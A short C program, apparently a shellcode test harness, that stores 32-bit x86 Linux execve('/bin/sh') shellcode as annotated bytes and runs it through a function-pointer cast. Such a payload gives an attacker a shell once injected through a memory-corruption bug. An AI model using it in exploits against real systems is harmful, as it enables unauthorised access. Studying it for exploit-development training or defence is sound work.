#include <stdio.h>
#include <string.h>
#include <unistd.h>

unsigned char shellcode[] = \
"\x31\xc0"              // xor    %eax,%eax
"\x50"                  // push   %eax
"\x68""//sh"           // push   $0x68732f2f
"\x68""/bin"           // push   $0x6e69622f
"\x89\xe3"             // mov    %esp,%ebx
"\x50"                  // push   %eax
"\x53"                  // push   %ebx
"\x89\xe1"             // mov    %esp,%ecx
"\x99"                  // cltd
"\xb0\x0b"             // mov    $0xb,%al
"\xcd\x80";             // int    $0x80

int main() {
    printf("Shellcode Length:  %d\n", (int)strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
